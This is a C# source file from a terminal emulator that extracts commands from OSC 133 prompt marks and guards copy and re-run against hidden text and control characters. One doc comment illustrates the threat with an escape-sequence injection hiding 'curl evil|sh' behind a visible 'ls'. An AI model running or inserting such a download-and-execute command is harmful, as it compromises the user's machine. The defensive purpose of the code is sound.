using System.Text;
using VelaShell.Terminal.Emulation;

namespace VelaShell.Terminal.Semantics;

/// <summary>命令块里用户敲的那条命令:<c>OSC 133 ; B</c> 到 <c>C</c> 之间的文本。</summary>
/// <param name="Text">
/// 命令文本。被自动换行折开的接回一行;硬换行(多行命令)保留为 <c>\n</c>;
/// 每行行尾空白去掉,行首空白保留(bash 的 <c>HISTCONTROL=ignorespace</c> 靠行首空格不记历史);
/// 控制字符(C0 / DEL / C1)一律剔除。
/// </param>
/// <param name="LineCount">硬换行分出的行数;1 = 单行命令。</param>
/// <param name="HasUnmarkedContinuation">
/// 多行命令里有续行<b>没带 B</b>:续行提示符(PS2,默认 <c>&gt; </c>)和命令正文分不开,
/// 切出来的文本里混着提示符。见 <see cref="CanRerun" />。
/// </param>
/// <param name="HasHiddenText">
/// B 与 C 之间有<b>屏幕上看不见</b>的内容:SGR 8 隐藏的字,或控制字符(已从 <paramref name="Text" /> 里剔掉)。
/// 见 <see cref="CanCopy" />。
/// </param>
public sealed record CommandInput(string Text, int LineCount, bool HasUnmarkedContinuation, bool HasHiddenText)
{
    /// <summary>是不是多行命令(中间夹着硬换行)。</summary>
    public bool IsMultiline => LineCount > 1;

    /// <summary>
    /// 切出来的文本能不能复制出去。
    /// </summary>
    /// <remarks>
    /// 有看不见的内容时不能。OSC 133 标记谁都能发 —— <c>cat</c> 一个文件、<c>curl</c> 一段输出,
    /// 里面的 <c>ESC]133;A … B ls ESC[8m; curl evil|sh ESC[28m C</c> 就能立起一个像模像样的命令块,
    /// 屏幕上只看得见 <c>ls</c>。用户以为复制 / 重跑的是 <c>ls</c>,拿到的却是整串。
    /// 真 shell 回显的命令里不会有隐藏的字和控制字符,拒掉不误伤。
    /// </remarks>
    public bool CanCopy => !HasHiddenText;

    /// <summary>
    /// 切出来的文本能不能原样再执行一次。
    /// </summary>
    /// <remarks>
    /// 续行没带 B 时不能:默认的续行提示符 <c>&gt; </c> 会混进文本,重跑
    /// <c>cat &lt;&lt;EOF</c> / <c>&gt; important.txt</c> / <c>&gt; EOF</c> 这样的命令,第二行就成了
    /// 「把 important.txt 截成空文件」。这种块的复制不受影响 —— 复制出去的东西用户粘贴前看得见。
    /// 有看不见的内容时同样不能(见 <see cref="CanCopy" />)。
    /// </remarks>
    public bool CanRerun => !HasUnmarkedContinuation && !HasHiddenText;
}

/// <summary>一条命令块在缓冲区里的位置(绝对行号,含首含尾)。</summary>
/// <param name="PromptRow">提示符行(<c>OSC 133 ; A</c>)。块由它起头,退出码也记在这一行。</param>
/// <param name="OutputStart">输出首行(<c>OSC 133 ; C</c>);对端没发 C 时为 -1。</param>
/// <param name="LastRow">块的末行 —— 下一条提示符的上一行,或缓冲区末尾。</param>
/// <param name="ExitCode">命令退出码;尚未结束或对端没报时为 null。</param>
public readonly record struct CommandBlock(int PromptRow, int OutputStart, int LastRow, int? ExitCode)
{
    /// <summary>该块是否已知失败(退出码非 0)。</summary>
    public bool Failed => ExitCode is not null and not 0;

    /// <summary>该块有没有可选中的输出区间。</summary>
    public bool HasOutput => OutputStart >= 0 && LastRow >= OutputStart;
}

/// <summary>
/// 从行上的 <see cref="PromptMark" /> 推导命令块。
/// </summary>
/// <remarks>
/// <para>
/// <b>刻意不建模型、不存状态 —— 每次按需扫。</b>块的全部事实已经挂在
/// <see cref="TerminalRow.Mark" /> / <see cref="TerminalRow.ExitCode" /> 上,而行对象在滚动时
/// 按引用迁进 scrollback、在改列宽时由 <c>ReflowResize</c> 连标记一起搬 —— 也就是说,
/// <b>事实本身已经跟着内容走了</b>。再另建一张按行对象引用锚定的表(如
/// <c>GutterFoldModel</c> 那样),就得额外承担一份"什么时候作废"的心智负担,而 reflow
/// 恰恰会把那种表整体作废。
/// </para>
/// <para>
/// 扫描代价是 O(可见范围),调用点都是用户动作(按跳转键、点侧栏标记),不在每帧渲染路径上。
/// 渲染只需逐行读一个枚举,压根不经过这里。
/// </para>
/// </remarks>
public static class CommandBlocks
{
    /// <summary>
    /// 从 <paramref name="fromRow" /> 往上找最近的提示符行(不含 <paramref name="fromRow" /> 自身);
    /// 没有则返回 -1。
    /// </summary>
    public static int PreviousPrompt(TerminalScreen screen, int fromRow)
    {
        for (int abs = Math.Min(fromRow, screen.TotalRows) - 1; abs >= 0; abs--)
        {
            if (screen.ViewLine(abs).Mark == PromptMark.Prompt)
            {
                return abs;
            }
        }
        return -1;
    }

    /// <summary>
    /// 从 <paramref name="fromRow" /> 往下找最近的提示符行(不含 <paramref name="fromRow" /> 自身);
    /// 没有则返回 -1。
    /// </summary>
    public static int NextPrompt(TerminalScreen screen, int fromRow)
    {
        for (int abs = Math.Max(fromRow, -1) + 1; abs < screen.TotalRows; abs++)
        {
            if (screen.ViewLine(abs).Mark == PromptMark.Prompt)
            {
                return abs;
            }
        }
        return -1;
    }

    /// <summary>
    /// 返回包含 <paramref name="row" /> 的命令块;该行之上没有任何提示符标记时返回 null。
    /// </summary>
    /// <remarks>
    /// 落在提示符行自身时算<b>这一条</b>块(而不是上一条):用户点的是这条命令的标记,
    /// 要的显然是这条命令的输出。
    /// </remarks>
    public static CommandBlock? BlockAt(TerminalScreen screen, int row)
    {
        if (row < 0 || row >= screen.TotalRows)
        {
            return null;
        }
        int prompt = screen.ViewLine(row).Mark == PromptMark.Prompt ? row : PreviousPrompt(screen, row);
        if (prompt < 0)
        {
            return null;
        }
        int next = NextPrompt(screen, prompt);
        int last = (next < 0 ? screen.TotalRows : next) - 1;

        // 输出首行:块内第一条 C 标记。没有 C(对端只发了 A/B,或命令还没回车)时留 -1,
        // 调用方据 HasOutput 判断有没有东西可选。
        int outputStart = -1;
        for (int abs = prompt; abs <= last; abs++)
        {
            if (screen.ViewLine(abs).Mark == PromptMark.Output)
            {
                outputStart = abs;
                break;
            }
        }
        return new CommandBlock(prompt, outputStart, last, screen.ViewLine(prompt).ExitCode);
    }

    /// <summary>
    /// 切出 <paramref name="block" /> 里用户敲的命令(<c>B</c> 到 <c>C</c> 之间);
    /// 切不出来时返回 null。
    /// </summary>
    /// <remarks>
    /// <para>切不出来的几种情形,各有各的道理:</para>
    /// <list type="bullet">
    /// <item><b>块里没有 B</b> —— 老的集成脚本只发 A/C/D,不知道提示符在哪一列结束,
    /// 硬猜(找 <c>$ </c>、<c># </c>)会把提示符的一截当成命令。</item>
    /// <item><b>B 之后没有 C</b> —— 命令还在敲,或者敲了一半按 Ctrl+C 取消了(bash 会在行尾回显
    /// <c>^C</c>,切出来就是 <c>foo^C</c>)。只有真的回车执行过的才算「这条命令」。</item>
    /// <item><b>B 与 C 之间是空的</b> —— 在提示符上直接按了回车。</item>
    /// </list>
    /// <para>
    /// <b>C 可以落在下一条提示符那一行上。</b>没有输出的命令(<c>cd</c>)跑完,下一条提示符就画在
    /// C 那一行,行标记被 A 改写了,C 的列(<see cref="TerminalRow.InputEnd" />)还在。
    /// 反过来,那一行若同时有自己的 B 且 C 在 B 之后,那是下一条命令自己的 C,不归这一块。
    /// </para>
    /// <para>
    /// <b>续行</b>(多行命令硬换行之后的那些行)上若有自己的 B —— 续行提示符(PS2)末尾也发了 B ——
    /// 就从那个 B 切起,把续行提示符剪掉;没有就整行照收,并记下
    /// <see cref="CommandInput.HasUnmarkedContinuation" />。
    /// </para>
    /// </remarks>
    public static CommandInput? CommandInputOf(TerminalScreen screen, CommandBlock block)
    {
        if (block.PromptRow < 0 || block.PromptRow >= screen.TotalRows)
        {
            return null;
        }
        int last = Math.Min(block.LastRow, screen.TotalRows - 1);

        // B:块内第一个记了 B 的行。提示符重绘(readline 收到 SIGWINCH、zle reset-prompt)
        // 都是原地重画,B 落回同一行;取第一个,续行上的 B 才不会被当成命令起点。
        int startRow = -1;
        for (int abs = block.PromptRow; abs <= last; abs++)
        {
            if (screen.ViewLine(abs).InputStart >= 0)
            {
                startRow = abs;
                break;
            }
        }
        if (startRow < 0)
        {
            return null;
        }
        TerminalRow first = screen.ViewLine(startRow);
        int startCol = Math.Min(first.InputStart, first.Columns);

        // C:B 之后第一个记了 C 的位置,最远看到下一条提示符那一行。
        int limit = Math.Min(last + 1, screen.TotalRows - 1);
        int endRow = -1, endCol = 0;
        for (int abs = startRow; abs <= limit; abs++)
        {
            TerminalRow row = screen.ViewLine(abs);
            if (row.InputEnd < 0)
            {
                continue;
            }
            if (abs == startRow && row.InputEnd < first.InputStart)
            {
                continue; // 同一行上落在 B 之前的 C 是上一条(没有输出的)命令的。
            }
            if (abs > last && row.InputStart >= 0 && row.InputEnd >= row.InputStart)
            {
                break; // 下一条提示符那一行上、它自己的 B 之后的 C:那是下一条命令的。
            }
            endRow = abs;
            endCol = Math.Min(row.InputEnd, row.Columns);
            break;
        }
        if (endRow < 0)
        {
            return null;
        }

        var lines = new List<string>();
        var sb = new StringBuilder();
        bool unmarked = false;
        bool hidden = false;
        bool lineIsContinuation = false;
        bool lineMarked = false;
        for (int abs = startRow; abs <= endRow; abs++)
        {
            TerminalRow row = screen.ViewLine(abs);
            bool startsLine = abs == startRow || !screen.ViewLine(abs - 1).Wrapped;
            int from = 0;
            if (abs == startRow)
            {
                from = startCol;
            }
            else if (startsLine)
            {
                lineIsContinuation = true;
                lineMarked = row.InputStart >= 0;
                if (lineMarked)
                {
                    from = Math.Min(row.InputStart, row.Columns);
                }
            }
            int to = abs == endRow ? endCol : row.Columns;
            bool continues = abs != endRow && row.Wrapped;
            if (continues)
            {
                // 行尾没写过的格子(宽字符在末列放不下、挪到下一行后留下的空位)不是内容。
                while (to > from && row[to - 1] is { Rune: 0, IsWideTrailing: false })
                {
                    to--;
                }
            }
            for (int col = from; col < to; col++)
            {
                hidden |= AppendCommandCell(sb, row[col]);
            }
            if (continues)
            {
                continue;
            }
            // 一条逻辑行收完:去行尾空白,记下这一行是不是没带 B 的续行。
            string line = sb.ToString().TrimEnd();
            sb.Clear();
            if (lineIsContinuation && !lineMarked && line.Length > 0)
            {
                unmarked = true;
            }
            lines.Add(line);
        }

        // C 落在行首时,最后收的是 C 那一行的空串;一并去掉末尾的空行。
        while (lines.Count > 0 && lines[^1].Length == 0)
        {
            lines.RemoveAt(lines.Count - 1);
        }
        string text = string.Join('\n', lines);
        if (string.IsNullOrWhiteSpace(text))
        {
            return null;
        }
        return new CommandInput(text, lines.Count, unmarked, hidden);
    }

    /// <summary>
    /// 把一格的文本追加进命令文本,剔除控制字符;返回这一格里有没有屏幕上看不见的内容。
    /// </summary>
    /// <remarks>
    /// <para>
    /// 正常打印路径进不了 C0(解析器当场执行掉了),但 C1(U+0080–U+009F)是零宽字符,会被当成
    /// 组合标记挂在前一格上;会话字符集是 Latin-1 一类时它编出来就是 8 位的 CSI(0x9B)。
    /// 「重跑」要把这段文本当键盘输入送回去,屏幕上看不见的控制字符一个都不该跟着回去。
    /// </para>
    /// <para>
    /// SGR 8 隐藏的字照样收进文本,但报成「看不见」:渲染不画这些格的字形(判据与 <c>VelaTerminalControl</c>
    /// 画字形时相同;隐藏的空格看上去还是空格,不算),用户在屏幕上读到的命令里没有它们。
    /// 只剔掉也不行 —— 那样复制出去的是一条屏幕上没出现过的命令。调用方据此整条拒掉(<see cref="CommandInput.CanCopy" />)。
    /// </para>
    /// </remarks>
    private static bool AppendCommandCell(StringBuilder sb, in TerminalCell cell)
    {
        if (cell.IsWideTrailing)
        {
            return false;
        }
        if (cell.Rune == 0)
        {
            sb.Append(' ');
            return false;
        }
        if (IsControl(cell.Rune))
        {
            return true;
        }
        bool hidden = (cell.Flags & CellFlags.Invisible) != 0 && (cell.Rune != ' ' || cell.Combining is not null);
        sb.Append(char.ConvertFromUtf32(cell.Rune));
        if (cell.Combining is { } combining)
        {
            foreach (char ch in combining)
            {
                if (IsControl(ch))
                {
                    hidden = true;
                }
                else
                {
                    sb.Append(ch);
                }
            }
        }
        return hidden;
    }

    /// <summary>C0、DEL 与 C1 控制字符。</summary>
    private static bool IsControl(int rune) => rune is < 0x20 or >= 0x7F and <= 0x9F;

    /// <summary>
    /// 这一行上有 shell 自己的提示符:收到过 <c>OSC 133 ; A</c>(提示符从这里画起)或 <c>B</c>(提示符在这里结束,
    /// 续行提示符 PS2 末尾的也算)。
    /// </summary>
    /// <remarks>
    /// 输出触发器据此不应答 —— 那一行在等的是 shell 读命令,不是程序在提问。
    /// 只认 A / B:C 那一行是命令输出的首行,程序的提问正落在那种行上。
    /// </remarks>
    internal static bool CarriesShellPrompt(TerminalRow row) => row.Mark == PromptMark.Prompt || row.InputStart >= 0;

    /// <summary>
    /// 对端 shell 此刻是不是停在一条<b>空的</b>新提示符上 —— 「重跑」只在这时才往终端里打字。
    /// </summary>
    /// <remarks>
    /// <para>四条全满足才算:</para>
    /// <list type="number">
    /// <item><b>不在备用屏</b>:全屏程序(vim、less、htop)把整屏占着,打进去的字符是它的按键。</item>
    /// <item><b>上一条命令已经结束</b>(<see cref="TerminalEmulator.IsCommandRunning" /> 为 false):
    /// 还在跑的命令会把打进去的「命令 + 回车」当成自己的输入 —— sudo 的口令提示、ssh 进去的
    /// 另一台机器、读 stdin 的脚本。</item>
    /// <item><b>光标就停在当前这条提示符的 B 上</b>:用户已经敲了半截(或者正在 PS2 续行里),
    /// 再打一串进去就和那半截拼成一条谁也没想执行过的命令。取的是块内第一个 B,
    /// 续行上的 B 不算。</item>
    /// <item><b>光标下那一格从没写过</b>:敲了 <c>ls</c> 再按 Home 回到行首,光标也在 B 上,
    /// 可后面还躺着 <c>ls</c>。只看光标下这一格而不是整行剩余部分:zsh 的 RPROMPT
    /// 画在同一行的右端,看整行就永远不空。</item>
    /// </list>
    /// <para>
    /// 判断不了的一律当「不空闲」:没有 B(老集成)、提示符恰好占满一行(B 记在行尾之外,
    /// 光标还停在上一列)。宁可让「重跑」灰掉,也不往一个说不清状态的终端里打字。
    /// </para>
    /// </remarks>
    public static bool IsIdleAtPrompt(TerminalEmulator emulator)
    {
        if (emulator.IsAlternateScreen || emulator.IsCommandRunning || !emulator.HasPromptMarks)
        {
            return false;
        }
        TerminalScreen screen = emulator.Screen;
        int cursorAbs = screen.ScrollbackCount + screen.CursorY;
        if (BlockAt(screen, cursorAbs) is not { } block)
        {
            return false;
        }
        int startRow = -1;
        for (int abs = block.PromptRow; abs <= cursorAbs; abs++)
        {
            if (screen.ViewLine(abs).InputStart >= 0)
            {
                startRow = abs;
                break;
            }
        }
        if (startRow != cursorAbs)
        {
            return false;
        }
        TerminalRow row = screen.ViewLine(startRow);
        if (row.InputStart != screen.CursorX)
        {
            return false;
        }
        TerminalCell under = row[screen.CursorX];
        return under is { Rune: 0, IsWideTrailing: false, Combining: null };
    }
}
